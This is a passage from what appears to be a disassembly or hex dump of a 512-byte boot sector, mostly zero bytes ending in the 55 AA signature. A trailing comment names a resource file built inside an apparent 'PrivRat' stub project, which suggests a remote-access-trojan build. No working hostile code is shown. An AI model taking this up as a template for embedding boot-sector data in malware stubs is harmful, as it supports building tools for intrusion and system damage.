                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 AA) // ..............U.
// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\mydev\PrivRat\STUB\obj\x86\Release\Stub.res
